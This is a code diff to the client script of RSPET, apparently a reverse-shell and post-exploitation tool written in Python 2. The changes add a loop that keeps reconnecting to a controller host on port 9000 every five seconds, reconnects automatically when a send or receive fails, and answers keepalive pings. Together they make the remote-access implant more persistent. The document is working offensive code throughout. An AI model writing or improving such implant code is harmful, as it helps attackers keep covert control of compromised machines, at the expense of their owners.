@@ -1,12 +1,7 @@
-#!/usr/bin/python
+#!/usr/bin/env python2
 # -*- coding: <UTF-8> -*-
 """rspet_client.py: RSPET's Client-side script."""
-__author__ = "Kolokotronis Panagiotis"
-__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
-__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura"]
-__license__ = "MIT"
-__version__ = "0.1.0"
-__maintainer__ = "Kolokotronis Panagiotis"
+
 from __future__ import print_function
 from sys import exit as sysexit, argv
 from time import sleep
@@ -16,9 +11,35 @@ from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SO
 from socket import error as sock_error
 from pinject import UDP, IP
 
+__author__ = "Kolokotronis Panagiotis"
+__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
+__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura"]
+__license__ = "MIT"
+__version__ = "0.1.0"
+__maintainer__ = "Kolokotronis Panagiotis"
+
+address = None
 
 VERSION = "v0.0.6-full"
 
+def reconnect(sock=None):
+    global address
+
+    if not sock is None:
+        sock.close()
+    sock = socket(AF_INET, SOCK_STREAM)
+
+    while True:
+        try:
+            sock.connect((address, 9000))
+        except sock_error:
+            sleep(5)
+        else:
+            if make_en_stdout(VERSION, sock) == 1:
+                sysexit()
+            break
+
+    return sock
 
 def get_len(in_string, max_len):
     """Calculate string length, return as a string with trailing 0s.
@@ -47,8 +68,7 @@ def make_en_stdout(stdout, sock):
     try:
         sock.send(en_stdout)
     except sock_error:
-        sock.close()
-        return 1
+        return make_en_stdout(stdout, reconnect(sock))
     return 0
 
 
@@ -65,8 +85,7 @@ def make_en_bin_stdout(stdout, sock):
     try:
         sock.send(en_stdout)
     except sock_error:
-        sock.close()
-        return 1
+        return make_en_bin_stdout(stdout, reconnect(sock))
     return 0
 
 
@@ -81,11 +100,19 @@ def make_en_data(data):
 def get_en_data(sock, size):
     """Get data, return string."""
     data = sock.recv(size)
-    return make_en_data(data).decode('UTF-8')
+    if data == b'':
+        return get_en_data(reconnect(sock), size)
+
+    result = make_en_data(data).decode('UTF-8')
+    if result == "ping":
+        make_en_stdout("pong", sock)
+        return get_en_data(sock, size)
+    return result
 
 
 def get_en_bin_data(sock, size):
     """Get data, return binary."""
+    print("bin recv called!")
     data = sock.recv(size)
     return make_en_data(data)
 
@@ -339,17 +366,14 @@ COMM_SWTCH = {
 
 
 def main():
+    global address
+
     try:
-        rhost = argv[1]
-        rport = 9000
+        address = argv[1]
     except IndexError:
-        print ("Must provide hotst")
+        print ("Must provide host")
         sysexit()
-    sock = socket(AF_INET, SOCK_STREAM)
-    sock.connect((rhost, rport))
-    en_stdout = make_en_stdout(VERSION, sock)
-    if en_stdout == 1:
-        sysexit()
+    sock = reconnect()
 
     while True:
         en_data = get_en_data(sock, 5)
